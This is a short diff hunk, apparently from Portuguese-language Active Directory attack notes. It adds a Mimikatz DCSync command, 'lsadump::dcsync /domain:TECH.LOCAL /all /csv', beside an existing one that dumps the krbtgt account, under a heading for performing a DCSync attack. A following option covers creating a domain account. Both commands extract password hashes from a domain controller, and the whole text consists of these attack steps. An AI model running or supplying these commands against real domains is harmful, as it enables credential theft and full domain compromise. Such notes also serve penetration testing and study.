@@ -1366,6 +1366,7 @@ Invoke-Mimikatz
 OPÇÃO 1 - FAZER O ATAQUE DCSYNC
 ```
 lsadump::dcsync /user:tech\krbtgt
+lsadump::dcsync /domain:TECH.LOCAL /all /csv
 ```
 OPÇÃO 2 - CRIAR UMA CONTA NO DOMINIO
 ```
